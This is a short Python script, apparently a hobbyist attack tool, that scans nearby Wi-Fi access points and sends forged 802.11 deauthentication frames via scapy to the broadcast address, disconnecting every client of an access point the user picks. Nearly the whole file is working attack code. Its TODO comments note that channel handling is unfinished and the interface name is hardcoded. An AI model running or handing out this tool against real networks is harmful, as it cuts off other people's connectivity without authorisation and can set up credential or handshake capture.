import subprocess
import re

import scapy.all

from ap import AP
from interface import Interface

BROADCAST = "ff:ff:ff:ff:ff:ff"
MANGO = "94:83:C4:1A:34:56"

## TODO
# 1. fix this channel stuff - won't deauth if wrong channel
# can't hard code 6 in airmon-ng start
# hint: AP channel retrieved in scan_for_aps method() (ap.channel)
# 2. maybe better to use subprocess, not os.system

def scan_for_aps(interface):
    PATTERN = {"MAC Address": 'Address:(.*)',
            "ESSID": 'ESSID:(.*)',
            "Power": 'Signal level=(.*)',
            "Channel": 'Channel:(.*)',
            "ID": '(.*) - Address'}
    aps = []
    print(f"[*] Scanning for APs, please wait")
    if interface.monitor == True:
        interface.monitor_off()
    result = subprocess.check_output(f"sudo iwlist {interface.name} s", shell=True).decode()
    for name, pattern in PATTERN.items():
        PATTERN[name] = re.compile(pattern)
    for line in result.split("Cell"):
        if line and "Scan completed" not in line:
            try:
                ap = AP()
                ap.mac = PATTERN["MAC Address"].findall(line)[0].strip()
                ap.ssid = PATTERN["ESSID"].findall(line)[0].strip('"')
                ap.power = PATTERN["Power"].findall(line)[0].strip()
                ap.channel = PATTERN["Channel"].findall(line)[0].strip()
                ap.id = str(int(PATTERN["ID"].findall(line)[0].strip()))
                ap.clean()
                aps.append(ap)
            except IndexError:
                continue
    return aps

# scapy.all.Dot11() reference
# addr1 = target (client) device MAC - ff for all clients
# addr2 = AP MAC (transmitter address in pcap?)
# addr3 = AP MAC (transmitter address in pcap?)

def send_deauth_frames(ap_address, target_address, interface, duration):
    if interface.monitor == False:
        interface.monitor_on()
    packet = scapy.all.RadioTap() / \
            scapy.all.Dot11(addr1=target_address, 
                            addr2=ap_address, 
                            addr3=ap_address) / \
            scapy.all.Dot11Deauth()
    scapy.all.sendp(packet, iface="wlan1mon", count=100, 
                    inter=0.2, verbose=1)

i = Interface()
aps = scan_for_aps(i)
for index, ap in enumerate(aps):
    print(f"[{index}] - {ap.ssid} - {ap.mac} - {ap.power} - {ap.channel} - {ap.id}")

while True:
    choice = input("[>] Select an AP to de-auth all clients: ")
    ap = aps[int(choice)]
    print(f"[!] Chosen AP: {ap.ssid}")
    send_deauth_frames(ap.mac, BROADCAST, i, 20)
